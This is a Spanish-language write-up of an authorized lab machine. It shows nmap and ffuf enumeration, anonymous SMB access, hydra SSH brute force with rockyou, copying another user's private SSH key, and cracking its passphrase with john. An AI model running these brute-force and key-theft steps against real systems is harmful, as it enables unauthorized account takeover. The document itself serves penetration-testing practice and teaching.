# Basic Pentesting — Writeup

**Objetivo:** Máquina de laboratorio (IP: `$IP`) — Fecha: 2025-09-26
**Alcance:** Pruebas autorizadas sobre la máquina de laboratorio. No publicar credenciales ni claves privadas.

---

## TL;DR

Se identificaron servicios HTTP, SSH y Samba. Se encontró un share anónimo con `staff.txt` que sugiere el usuario `jan`. Se obtuvo acceso SSH a `jan` por fuerza bruta (wordlist `rockyou`), desde `jan` se recuperó la clave privada de `kay` y se crackeó su passphrase con `john`, permitiendo acceso final como `kay`.

---

## Entorno y herramientas

* Kali Linux (o similar)
* nmap 7.95
* ffuf
* smbclient
* hydra
* john / ssh2john
* Wordlists: `/usr/share/wordlists/rockyou.txt`, `directory-list-2.3-small.txt`

Evidencia completa y salidas largas se almacenan en la carpeta `evidence/` (archivos con credenciales o claves están **REDACTED** y no se suben públicamente).

---

## Enumeración (nmap)

**Comando**

```bash
nmap -sV --open $IP
```

**Comentario:** `-sV` detecta versiones de servicios. 

**Resultado**
```bash
# Nmap 7.95 scan initiated Fri Sep 26 19:54:46 2025 as: /usr/lib/nmap/nmap --privileged -sV --open $IP
Nmap scan report for $IP
Host is up (0.35s latency).
Not shown: 996 closed tcp ports (reset)
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http        Apache httpd 2.4.41 ((Ubuntu))
139/tcp open  netbios-ssn Samba smbd 4
445/tcp open  netbios-ssn Samba smbd 4
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Sep 26 19:55:04 2025 -- 1 IP address (1 host up) scanned in 18.58 seconds
```
**Resumen**

* 22/tcp open  ssh (OpenSSH 8.2p1)
* 80/tcp open  http (Apache/2.4.41)
* 139/445/tcp open Samba (smbd)

---

## Enumeración de directorios web (ffuf)

**Comando**

```bash
ffuf -u http://$IP/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -t 300 -s -c
```

**Comentario:** `-t 300` define la cantidad de hilos; `-s` silencia headers extra; `-c` activa color en resultado.

**Resultado**
```bash
# Priority-ordered case-sensitive list, where entries were found
#
# Suite 300, San Francisco, California, 94105, USA.
# Copyright 2007 James Fisher
# or send a letter to Creative Commons, 171 Second Street,
# license, visit http://creativecommons.org/licenses/by-sa/3.0/
#

# directory-list-2.3-small.txt
#
# Attribution-Share Alike 3.0 License. To view a copy of this
#
# This work is licensed under the Creative Commons
# on at least 3 different hosts
development
```
**Resultado relevante**

* `/development`

---

## Smb — share anónimo

**Enumeración**

```bash
smbclient -L //$IP
```

**Resultado**
```bash
	Sharename       Type      Comment
	---------       ----      -------
	Anonymous       Disk      
	IPC$            IPC       IPC Service (Samba Server 4.15.13-Ubuntu)
Reconnecting with SMB1 for workgroup listing.
Protocol negotiation to server $IP (for a protocol between LANMAN1 and NT1) failed: NT_STATUS_INVALID_NETWORK_RESPONSE
Unable to connect with SMB1 -- no workgroup available
```
**Resultado relevante**
* Share accesible: `Anonymous (Disk)`

**Conexión y archivo**

```bash
smbclient //$IP/Anonymous
smb: \> ls
smb: \> get staff.txt
```
<details>
  <summary><i>staff.txt</i></summary>
  
```bash
  Announcement to staff:

PLEASE do not upload non-work-related items to this share. I know it's all in fun, but
this is how mistakes happen. (This means you too, Jan!)

-Kay
```

</details>

**Comentario:** Indicio de usuario `jan`. Revisar si el share expone archivos sensibles o rutas del filesystem.

---

## Fuerza bruta SSH (usuario: jan)

**Comando**

```bash
hydra -l jan -P /usr/share/wordlists/rockyou.txt -t 4 ssh://$IP
```

**Comentario:** `-l` especifica login; `-P` wordlist; `-t 4` tareas paralelas. Usar siempre con autorización.

**Resultado (REDACTED en repo público)**

* Credenciales válidas obtenidas para `jan`.

---

## Acceso inicial y obtención de clave

**Operaciones realizadas**

```bash
ssh jan@$IP
# desde la sesión de jan:
scp jan@$IP:/home/kay/.ssh/id_rsa ./
```

**Comentario:** La clave privada `id_rsa` estaba accesible desde la cuenta `jan` — investigar permisos del fichero y si el share/sistema expuso la ruta. No se sube la clave al repo.

---

## Cracking de passphrase y acceso final

**Conversión y cracking**

```bash
ssh2john id_rsa > rsa_john.txt
john rsa_john.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

**Resultado (REDACTED)**

* Passphrase crackeada.

**Uso**

```bash
ssh -i id_rsa kay@$IP
# introducir passphrase para la clave
cat pass.bak
```
